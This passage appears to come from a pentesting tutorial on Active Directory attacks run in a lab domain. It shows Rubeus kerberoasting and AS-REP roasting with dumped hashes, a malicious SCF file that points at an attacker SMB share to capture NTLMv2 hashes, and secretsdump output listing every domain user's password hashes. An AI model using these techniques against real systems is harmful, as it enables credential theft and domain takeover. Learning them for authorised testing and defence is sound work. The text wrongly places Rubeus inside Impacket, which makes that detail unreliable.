        Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a diamond TGT by requesting a TGT based on a user password/hash:
        Rubeus.exe diamond /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/createnetonly:C:\Windows\System32\cmd.exe] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]
    
    Forge a diamond TGT by requesting a TGT using a PCKS12 certificate:
        Rubeus.exe diamond /user:USER /certificate:C:\temp\leaked.pfx </password:STOREPASSWORD> [/createnetonly:C:\Windows\System32\cmd.exe] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]
    
     Forge a diamond TGT by requesting a TGT using tgtdeleg:
        Rubeus.exe diamond /tgtdeleg [/createnetonly:C:\Windows\System32\cmd.exe] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]


 Ticket management:

    Submit a TGT, optionally targeting a specific LUID (if elevated):
        Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID]

    Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated):
        Rubeus.exe purge [/luid:LOGINID]

    Parse and describe a ticket (service ticket or TGT):
        Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI> [/servicekey:HASH] [/krbkey:HASH] [/asrepkey:HASH] [/serviceuser:USERNAME] [/servicedomain:DOMAIN]


 Ticket extraction and harvesting:

    Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID, username, or service:
        Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]

    List all current tickets in detail (if elevated, list for all users), optionally targeting a specific LUID:
        Rubeus.exe klist [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]

    Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:
        Rubeus.exe dump [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM] [/nowrap]

    Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:
        Rubeus.exe tgtdeleg [/target:SPN]

    Monitor every /interval SECONDS (default 60) for new TGTs:
        Rubeus.exe monitor [/interval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS]

    Monitor every /monitorinterval SECONDS (default 60) for new TGTs, auto-renew TGTs, and display the working cache every /displayinterval SECONDS (default 1200):
        Rubeus.exe harvest [/monitorinterval:SECONDS] [/displayinterval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS]


 Roasting:

    Perform Kerberoasting:
        Rubeus.exe kerberoast [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting, outputting hashes to a file:
        Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]

    Perform Kerberoasting, outputting hashes in the file output format, but to the console:
        Rubeus.exe kerberoast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting with alternate credentials:
        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting with an existing TGT:
        Rubeus.exe kerberoast </spn:"blah/blah" | /spns:C:\temp\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT using an enterprise principal:
        Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:
        Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/ldaps] [/nowrap]

    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
        Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]

    Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
        Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]

    List statistics about found Kerberoastable accounts without actually sending ticket requests:
        Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
        Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
        Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]

    Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:
        Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]

    Perform AES Kerberoasting:
        Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]

    Perform Kerberoasting using an account without pre-auth by sending AS-REQ's:
        Rubeus.exe kerberoast </spn:"blah/blah" | /spns:C:\temp\spns.txt> /preauth:USER /domain:DOMAIN [/dc:DOMAIN_CONTROLLER] [/nowrap]

    Perform AS-REP "roasting" for any users without preauth:
        Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform AS-REP "roasting" for any users without preauth, outputting Hashcat format to a file:
        Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]

    Perform AS-REP "roasting" for any users without preauth using alternate credentials:
        Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."] [/ldaps] [/nowrap]


 Miscellaneous:

    Create a hidden program (unless /show is passed) with random (or user-defined) /netonly credentials, displaying the PID and LUID:
        Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show] [/username:USERNAME] [/domain:DOMAIN] [/password:PASSWORD]

    Reset a user's password from a supplied TGT (AoratoPw):
        Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER] [/targetuser:DOMAIN\USERNAME]

    Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hashes:
        Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN]

    Substitute an sname or SPN into an existing service ticket:
        Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:ldap [/ptt] [/luid] [/nowrap]
        Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:cifs/computer.domain.com [/ptt] [/luid] [/nowrap]
    
    Display the current user's LUID:
        Rubeus.exe currentluid

    Display information about the (current) or (target) logon session, default all readable:
        Rubeus.exe logonsession [/current] [/luid:X]

    The "/consoleoutfile:C:\FILE.txt" argument redirects all console output to the file specified.

    The "/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function.

    The "/debug" flag outputs ASN.1 debugging information.


 NOTE: Base64 ticket blobs can be decoded with :

    [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))


PS C:\Windows\Temp> 
```

Here we can see that we can do a **bunch** of things, but let's focus in `kerberoast` funcion:

```zsh
PS C:\Windows\Temp> ./Rubeus.exe kerberoast /creduser:ruycr4ft.local\sponce /credpassword:Password2
./Rubeus.exe kerberoast /creduser:ruycr4ft.local\sponce /credpassword:Password2

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : ruycr4ft.local
[*] Searching path 'LDAP://WIN-FV8S9VU238J.ruycr4ft.local/DC=ruycr4ft,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=SVC_SQLService,CN=Users,DC=ruycr4ft,DC=local
[*] ServicePrincipalName   : ruycr4ft.local/svc_sql.WIN-FV8S9VU238J
[*] PwdLastSet             : 5/25/2023 9:25:04 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_sql$ruycr4ft.local$ruycr4ft.local/svc_sql.WIN-FV8S9VU238J@ruycr
                             4ft.local*$95D51059FE38B26D45E19223C1CBDCEE$1EF269B1BEC6C04EB4C1C514C99A7781EBF7
                             4D909F37EEC43B52DEE98791EC3212B4E1D057C728934BE57A9C2675A83053734D09DE09E5E2AD89
                             BAAFE6FB8BA56E4919DD4BC3C499E5697D919DAE0BA9994389A5878EDAADE70CE86E883E5AEAF0D2
                             5DB3AB04E05E760353089D13587992D2A347CF7DE9B4FA1E00AFE26A63A2F251D08ECA0737426633
                             F699C64209A00AC936873734E33765B87FE31DC6DF711E9F8A822BB3550B70C75B03E6E5905B2B60
                             18E3652ED4E5448605291AED8821BCC12B76D8A55BC38B2DA00ECF5CFD290D3D3AA078C16B171C4C
                             A1410B42D04833D9805D795F44AFED44FFA2B79B87AAB312AF9C9E194C0E4CFA13E8E3D2A4B0969D
                             15ED41A8457608F3AD41B324E8359DE4EAC32BAB486EA0EF7167E7082D3FF197C718FB2D1514E04F
                             46A57091EC302B698CBCB8007A1987C2477698954CD505F7B77438D0D62D2F7319548D7C7A5234A4
                             493DAA030DEFC392874DCB1AA3CF1193B9F9E5B1A67188E21AE63373FF08BBB109C24A504B638AC5
                             6ECAAE2232C08BC2E94C222B5B569E30B57AD7D06D1CCCE4BF1DB5156EA3954EE0FD4EF7B837887C
                             E94A82154448D066EF29F160B93FBAD34324D342C5A938B39ED6868A1BE48D60F54EA7217835CCE5
                             C52D6C7A4A3149C79DD20EFE81ADBF895174C45507AE27D7C07C917DC8FAB4C11C0AF07C08D4B95F
                             3698890B92A3161E6960CA7F3B9F97A130DF94F442A016153FB42BE5423B38B379BF7AEAD3A98EFA
                             D465840B1C2CEAA61D3BD563F6FD3F4FA64AF64EA69D0339D0990EBA47ECA6B0A2DF83039BD265BE
                             28EBDF10FD61F290D89FFBFD1C5634E9BFB25404C6146D456631CDF1F528C8807B2866A434FFADFE
                             F91B6199095B01A254F05B698ED470A5CFDA01019A6F7978F3A2FC0213D6B84F0F799AAC6D7784A0
                             1BE0DA8B16B34F6A9E98A1265BDA3C59566800E3AB9809C60ABA77EF0B3E45137D875F2976203AD0
                             83B6BAC7F5A612EA35AC98876749FCBF2C197093F4A845D69F943E82E305AF1E2DFAE0EB66A87799
                             EB0E66CAB1CBB20C8173772F0302672077CF2891F1C5D136AF239DF8CF041C607AA758AC5CA7D687
                             FA3326EA4E909424B7B7F03DEB11D78E13AF0868ABE8736E54712F6F95D5FCCE74C12662C9F7F215
                             BB770F753506F622541C7174FC283904C6AFD93EEF36DAA0BB7F3598FA6598B8C0E28041454129AA
                             8DCE8B2BAD2EA9D803004DA73FF0EB35C38532F57246D735337CE32F8D734F3D4A3CE322D51A95AB
                             121A93C4759FD45D9F5384EFCF95E1D724249029747D31A80A5141DAC1DDFD6C11290F086348FA96
                             C0ACD76A44D5CE1E0A1C42CA714F5E1D50666B737A7637D3EAA5AF59F847E1C68F82D3E68A82E7CC
                             D5E1AA3CDFB72CFB773CA6417533A3436FC57FC956586E6C8C9A3992EDA8C68D1882ACC8B1FF8233
                             6EF9DBCC8D3231CE3C8D587363DFC2A0223779FD7AE12E21C57F012B36CD8E37BADD62984B9A060F
                             382DE52702BE46734D77811D13741DF6DBC6B515AD4A1891A5D972EC1B0449CFDCF1667B717C1BA0
                             9D46D120B34E1E56FF8C45AEE167222C675ADCDF9B5E6F1535EFA69E25184D28BEE173CD149CFC8F
                             E81DD142F5A4913371694D0AFDD98C74A03CC5B2BE0BC4E8B8EDFB9CC27BB41CCDA355F1898206CA
                             1B

PS C:\Windows\Temp> 
```

This is the same as the usual `kerberoasting`, we can use **any** credentials while they are valid.
Now you could try to crack the password with `john`, same thing as usual.

# Rubeus - AS-REP Roast

- - -

The AS-REP Roasting attack is a technique used to extract encrypted AS-REP (Authentication Service Response) messages from a domain controller in a Windows Active Directory environment. It targets user accounts that have the "Do not require Kerberos preauthentication" flag enabled, allowing the encrypted AS-REP message to be extracted and potentially cracked offline.

The main difference between a regular AS-REP Roast attack and an AS-REP Roast attack using Rubeus lies in the tools used and the additional features provided by Rubeus.

- In a regular AS-REP Roast attack, you would typically use manual methods or custom scripts to identify user accounts with the preauthentication flag disabled, extract the AS-REP messages, and attempt to crack them using offline techniques such as dictionary or brute force attacks.

- Rubeus, on the other hand, is a tool within the Impacket framework specifically designed to automate and simplify Kerberos-related attacks. It provides functionalities to perform AS-REP Roasting attacks and offers several advantages:

- Automated AS-REP Roasting: Rubeus streamlines the AS-REP Roasting process by automating the extraction of AS-REP messages from the domain controller.

- Enhanced functionality: Rubeus provides additional features beyond AS-REP Roasting, such as the ability to request and extract TGT (Ticket Granting Ticket) tickets, manipulate Kerberos tickets, perform pass-the-ticket attacks, and more.

- Flexible output formats: Rubeus offers options to output the extracted AS-REP messages in various formats, making it easier to process and analyze the results.

- Additional attack techniques: Rubeus includes other attack techniques related to Kerberos, such as Kerberoasting, Golden Ticket attacks, and Silver Ticket attacks, allowing for a broader range of attack scenarios.

In summary, while both regular AS-REP Roast attacks and AS-REP Roast attacks using Rubeus target the same vulnerability, Rubeus provides a more streamlined and feature-rich approach to automate the attack process, extract AS-REP messages, and perform additional Kerberos-related attack techniques.

## PoC

- - -

The procedure would be the same as we did earlier: upload `Rubeus` and execute the right command:

```zsh
PS C:\Windows\Temp> ./Rubeus.exe asreproast /user:sromero /domain:ruycr4ft.local /dc:WIN-FV8S9VU238J
./Rubeus.exe asreproast /user:sromero /domain:ruycr4ft.local /dc:WIN-FV8S9VU238J

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: AS-REP roasting

[*] Target User            : sromero
[*] Target Domain          : ruycr4ft.local
[*] Target DC              : WIN-FV8S9VU238J

[*] Using domain controller: WIN-FV8S9VU238J (fe80::1e2e:ac4a:2102:569f%5)
[*] Building AS-REQ (w/o preauth) for: 'ruycr4ft.local\sromero'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$sromero@ruycr4ft.local:57F0D065B280E399D0B60C088D2EC546$8982D5AEA3582
      9651543BFD969A339CE0EF7BC17B3217CFFB27531E6DC514379CD896023D2D884113CFF20CB5720D
      2D82D51FC5D4426FF56905BB2C1197C6BF7FB7B45CA4ADA7191A1BB97D8622F02AF7DACBC5F73DA4
      10156D73733EE8420861B44732FCB2DD8BC40281242C3F8B8E48AC1A96E8ABFD074BA21432191CC1
      D3DC37F3F637B422BB19FC9B9712E530A1168CB2C1BC8E66987B0AF8235D5E768AFE15D095ECC3B8
      4AEFD294D8F6BBDA0A3D14BD00CB74722698989759E94933D3253896A6A9AFF6641893E73B35BCC7
      8EE90C69587B8D7F1924C4FCFFD28A8B3BEF45C5E08DD603FEB434233594E9A5A31

PS C:\Windows\Temp> 
```

Same thing as usual. Now you could copy the hash and crack it, as we did in regular attack.

# SCF Files

- - -

An SCF file, also known as a "Shell Command File," is a file format used in Windows operating systems. It is primarily associated with the Windows Explorer Shell, which provides the graphical user interface (GUI) for interacting with files, folders, and system operations.

An SCF file is a text file that contains a series of commands that are executed when the file is opened or accessed. These commands can include various actions, such as launching applications, executing scripts, or performing system operations.

In the context of Windows, SCF files are typically used for customization and automation purposes. Users can create SCF files to perform specific tasks or automate repetitive actions. For example, an SCF file may contain commands to open specific folders, launch applications with predefined settings, or perform system configurations.

## PoC

- - -

First we will list the `shred` resources:

```zsh
❯ smbclient -U "ruycr4ft.local\sponce%Password2" -L 192.168.0.115 -smb2support
Can't load mb2support - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	sharedFiles     Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

We can see a `sharedFiles` share. Let's try to connect to it:

```zsh
❯ smbclient -U "ruycr4ft.local\sponce%Password2" //192.168.0.115/sharedFiles -smb2support
Can't load mb2support - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri May 26 19:51:31 2023
  ..                                  D        0  Fri May 26 19:51:31 2023

		6412543 blocks of size 4096. 3320085 blocks available
smb: \> 
```

Now we can create a malicious `.scf` file:

```s
[Shell]
Command=2
IconFile=\\192.168.0.106\smbFolder\pwned.ico
[Taskbar]
Command=ToggleDesktop
```

What happens to this files? Well, the main thing is that you can poison the explorer icon! 

![](/assets/img/AD/13.png)

Let's put this malicious file:

```zsh
❯ smbclient -U "ruycr4ft.local\sponce%Password2" //192.168.0.115/sharedFiles -smb2support
Can't load mb2support - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> put malicious.scf
putting file malicious.scf as \malicious.scf (4,0 kb/s) (average 4,0 kb/s)
smb: \> 
```

Now we need to create an `smbserver`:

```zsh
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now, just with the simple fact that the user **open** the folder, **just open it**, it will give you it's hash!:

![](/assets/img/AD/14.png)

And if you check your `smbserver`:

```zsh
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.0.115,63205)
[*] AUTHENTICATE_MESSAGE (RUYCR4FT\Administrator,WIN-FV8S9VU238J)
[*] User WIN-FV8S9VU238J\Administrator authenticated successfully
[*] Administrator::RUYCR4FT:aaaaaaaaaaaaaaaa:097ff8a9b690c463a3636d8c53289a61:010100000000000000a698770190d90139193d5220a2574d000000000100100069004e006b005a006b006600410042000300100069004e006b005a006b00660041004200020010007300730077006100540061004700660004001000730073007700610054006100470066000700080000a698770190d9010600040002000000080030003000000000000000000000000030000046be996912bf6901dd6f86966b3f47fca11563713e8fd03716b4c96ab691f1ff0a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0030002e003100300036000000000000000000
[*] Closing down connection (192.168.0.115,63205)
[*] Remaining connections []
```

Great!! This technique allow us to get NTLMv2 hash of the user!

# Secretsdump

- - -

For this point, I am going to use as example the last part of `Attacktive Directory` machine, enjoy!

Ok, so with `bloodhound` we get this info, which is pretty interesting:

![](/assets/img/AttacktiveDirectory/2.png)

With this privilege we should be able to extract all the hashes of **all** users of the Domain Controller:

```zsh
❯ impacket-secretsdump spookysec.local/backup:backup2517860@10.10.128.202
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:0bf31d7054b52845b517504a3f43006a:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:940809a7ef7eea6a2cee204215f64db44f858c91498c925aba8538d05da88cbd
